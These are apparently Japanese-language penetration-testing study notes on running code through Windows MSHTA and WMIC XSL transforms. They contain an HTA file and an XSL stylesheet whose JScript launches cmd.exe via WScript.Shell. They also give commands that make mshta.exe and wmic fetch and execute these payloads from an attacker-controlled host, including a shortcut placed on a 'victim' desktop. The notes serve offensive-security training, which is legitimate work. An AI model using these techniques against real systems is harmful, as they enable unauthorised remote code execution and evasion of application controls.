# MSHTA

cmd.exeを開くhtaファイル
```hta
<html> 
<head> 
<script language="JScript">
var shell = new ActiveXObject("WScript.Shell");
var res = shell.Run("cmd.exe");
</script>
</head> 
<body>
<script language="JScript">
self.close();
</script>
</body> 
</html>
```

cmd.exeで実行
```bat
mshta C:\Tools\test.hta
```


リンクファイルから実行
ショートカットファイルを作成するには、Windows 10 の被害者マシンのデスクトップを右クリックし、 新規作成 -> ショートカットを選択します。新しいウィンドウで、MSHTA 実行可能ファイルのパス ( C:\Windows\System32\mshta.exe ) に続いて、 Kali マシン上の.htaファイルの URL を入力します。

```
C:\Windows\System32\mshta.exe http://192.168.45.198/test.hta
```

ダブルクリックするとcmd.exeが開かれる

# XSL変換
cmd.exeを開くXSLファイル
```xsl
<?xml version='1.0'?>
<stylesheet version="1.0"
xmlns="http://www.w3.org/1999/XSL/Transform"
xmlns:ms="urn:schemas-microsoft-com:xslt"
xmlns:user="http://mycompany.com/mynamespace">

<output method="text"/>
	<ms:script implements-prefix="user" language="JScript">
		
			var r = new ActiveXObject("WScript.Shell");
			r.Run("cmd.exe");
		
	</ms:script>
</stylesheet>
```

WMICでXSL変換をすることでJScriptコードが実行される
```
wmic process get brief /format:"http://192.168.45.198/test.xsl"
```